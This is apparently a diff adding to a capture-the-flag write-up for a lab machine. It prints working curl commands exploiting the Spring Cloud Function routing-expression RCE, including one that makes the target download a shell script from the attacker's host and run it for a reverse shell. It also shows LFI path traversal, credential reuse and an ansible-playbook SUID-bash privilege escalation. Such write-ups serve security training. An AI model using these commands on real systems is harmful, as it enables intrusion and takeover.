@@ -73,3 +73,88 @@ I am confirmed here that this path is vulnerable to LFI but I still not able to 
 ![image](https://user-images.githubusercontent.com/87700008/224542688-f6d088b2-33e1-49dd-b149-684d6b969433.png)
 
 I found 2 users in the above list 'frank' & 'phil'
+
+With further enumeration I found below results :
+
+![image](https://user-images.githubusercontent.com/87700008/224726062-e0834f2c-79ee-421c-92f6-1aa985611374.png)
+
+Enumerating further into below mentioned directory I found an xml config file :
+
+    ../../../../../../../../../../../../../../../../var/www/WebApp/pom.xml
+    
+In this config file I found a framework running with "Spring cloud function". Which is vulnerable to RCE found in this [blog](https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORKCLOUD-2436645) by Snyk
+    
+![image](https://user-images.githubusercontent.com/87700008/224727399-f526600f-191f-4142-82ef-acba6a648a56.png)
+
+
+I found this [exploit](https://github.com/darryk10/CVE-2022-22963) on GitHub for the spring framework module.
+
+Following the exploit I executed the below curl command to check wether I am able to create any file in the 'tmp' directory or not.
+
+    curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/expl0it")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
+
+![image](https://user-images.githubusercontent.com/87700008/224731422-f9dbf038-60a4-476b-b74c-3830b819a528.png)
+
+I observed that my 'expl0it' folder got created in the temp directory, now It's time for the shell.
+
+### Initial access:
+
+To get the reverse shell I created a bash file to received reverse shell in my machine with below code :
+
+![image](https://user-images.githubusercontent.com/87700008/224747729-b9ba917c-4be2-49e6-b1ce-4af09fcfc977.png)
+
+I started python3 http server & uploaded the bash file from my using using this command :
+
+    curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"curl http://10.10.14.103/hell.sh -o /tmp/hell.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
+    
+And then I executed the uploaded bash script using this command & got the reverse shell : (pwn3d!🙂)
+
+    curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"bash /tmp/hell.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
+    
+![image](https://user-images.githubusercontent.com/87700008/224748383-0c601555-c767-47d3-a5e8-6fd011b8d18e.png)
+
+In Frank's home directory I found a directory called '.m2' so I thought to give it a look & in the folder I found a settings.xml file which contains Phil's password :
+
+![image](https://user-images.githubusercontent.com/87700008/224754633-7fbf629c-c60e-4624-b4de-e78adebc97b2.png)
+
+![image](https://user-images.githubusercontent.com/87700008/224754874-d31ef599-37f2-4f96-96d3-7328ab8e31c0.png)
+
+I tried to login via SSH to Phil account with the gathered credential but I SSH was unsuccessfull. 😕
+But then I tried to directly switch user 'su phil' & this time I used the same password and I switched successfully. (pwn3d! 🙂)
+
+Now, that I have the Phil access I got the user flag.
+
+![image](https://user-images.githubusercontent.com/87700008/224756415-b5283543-5190-4b6a-a2b2-32ceafecdc22.png)
+
+## Priv Esc :
+
+For Privilege escalation I used 'linpeas' script but didn't got any hint, I tried manual enumeratyion as well but no luck there as well.
+
+Then I uploaded pspy binary to the Inject box & started checking the root process. I found that there is a process running called 'ansible-playbook' with root privileges :
+
+![image](https://user-images.githubusercontent.com/87700008/224776993-8622cded-e74f-4fdf-ad86-c7b1a865c672.png)
+
+I found an exploit here in [GTFO bins](https://gtfobins.github.io/gtfobins/ansible-playbook/) for the 'ansible-playbook'
+
+This tool is found to automate all "*yml" files in the /task directory in which the playbook_1.yml file is discovered. This file is a fragment of an Ansible playbook file, which is a YAML file that contains a series of tasks that must be executed by Ansible on a set of hosts or on a specific host.
+
+When checked the "/opt/automation/tasks" directory I found that apart from "root", "staff" user is also having the access for writing into the task directory.
+And Phil is in the Staff user group :
+
+![image](https://user-images.githubusercontent.com/87700008/224779114-b591dbc0-aae4-4700-99c1-399409b77c57.png)
+
+So, We can write into the 'task' directory & 'ansible-playbook' will run the file if the extension is ending with '.yml' hence I created a file inside the task directory named 'pe.yml' with the below code :
+
+```
+- hosts:  localhost
+  tasks:
+    - name: become root
+      command: chmod u+s /bin/bash
+      become: true
+```
+
+And after waiting for almost 1 minute I executed 'bash -p' & got the root access. (pwn3d!🙂)
+
+![image](https://user-images.githubusercontent.com/87700008/224781075-83c23094-5233-4aa6-992d-ef768a0adb18.png)
+
+
